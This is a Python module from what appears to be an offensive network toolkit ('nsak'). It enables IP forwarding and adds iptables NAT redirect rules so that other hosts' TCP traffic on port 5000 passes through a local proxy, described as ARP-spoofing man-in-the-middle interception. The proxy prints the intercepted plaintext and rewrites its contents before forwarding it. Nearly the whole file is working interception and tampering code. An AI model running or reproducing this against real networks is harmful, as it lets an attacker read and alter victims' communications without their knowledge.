import socket
import struct
import subprocess
import threading

from nsak.core import NetworkInterface
from nsak.core.network import NetworkDiscoveryResultMap

SO_ORIGINAL_DST = 80  # from linux/netfilter_ipv4.h
INTERNAL_PORT = 15_000


def set_ip_forwarding(value: bool) -> None:
    """
    Set ip forwarding on the system.

    :param value:
    :return:
    """
    str_value = "1" if value else "0"
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write(str_value)


def configure_iptables(network_interface: NetworkInterface, ip: str, port: int) -> None:
    """
    Setup iptables rules for forwarding packets to netfilter queue.

    :return:
    """
    subprocess.run(["update-alternatives", "--set", "iptables", "/usr/sbin/iptables-legacy"])
    subprocess.run([
        "iptables", "-t", "nat",
        "-A", "PREROUTING",
        "-i", network_interface.name,
        "-p", "tcp",
        "--dport", str(port),
        "!", "-s", ip,
        "-j", "REDIRECT",
        "--to-ports", str(INTERNAL_PORT)
    ], check=True)
    subprocess.run([
        "iptables", "-t", "nat",
        "-A", "OUTPUT",
        "-p", "tcp",
        "--dport", str(port),
        "!", "-s", ip,
        "-j", "REDIRECT",
        "--to-ports", str(INTERNAL_PORT)
    ], check=True)
    subprocess.run([
        "iptables",
        "-A", "INPUT",
        "-p", "tcp",
        "--dport", str(INTERNAL_PORT),
        "-j", "ACCEPT"
    ], check=True)


def get_original_address(sock: socket.socket) -> tuple[str, int]:
    """


    :param sock:
    :return:
    """
    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    _, port, raw_ip = struct.unpack("!HH4s8x", data)
    ip = socket.inet_ntoa(raw_ip)
    return ip, port


def forward_tcp_connection(source: socket.socket, destination: socket.socket) -> None:
    """


    :param source:
    :param destination:
    :return:
    """
    print(f"[+] Forwarding connection from {source.getpeername()} to {destination.getpeername()}")

    while True:
        data = source.recv(4096)
        if not data:
            break

        print(data.decode(), flush=True)
        data = data.replace(b"hello", b"h4ck3d by nsak")
        destination.sendall(data)

    source.close()
    destination.close()


def terminate_tcp_connection(client: socket.socket) -> None:
    """

    :return:
    """
    address = get_original_address(client)
    print(f"[+] Terminating connection to {address}")
    server = socket.create_connection(address)

    threading.Thread(target=forward_tcp_connection, args=(client, server)).start()
    threading.Thread(target=forward_tcp_connection, args=(server, client)).start()


def start_tcp_proxy(ip: str, port: int) -> None:
    """


    :return:
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((ip, port))
    sock.listen()

    while True:
        client, _ = sock.accept()
        terminate_tcp_connection(client)


def run(network_discovery_result_map: NetworkDiscoveryResultMap) -> None:
    """
    Start arp spoofing on the provided interfaces.
    """
    # @TODO: This just works for now, but consider refactoring
    port = 5_000

    set_ip_forwarding(True)
    for network_interface, network_discovery_result in network_discovery_result_map.results.items():
        nsak_ip = network_discovery_result.network_interface.nsak_ip
        configure_iptables(network_interface, nsak_ip, port)
        print(f"[+] MITM TCP proxy listening on iface {network_interface.name}: {nsak_ip}:{port}")
        threading.Thread(target=start_tcp_proxy, args=(nsak_ip, port)).start()
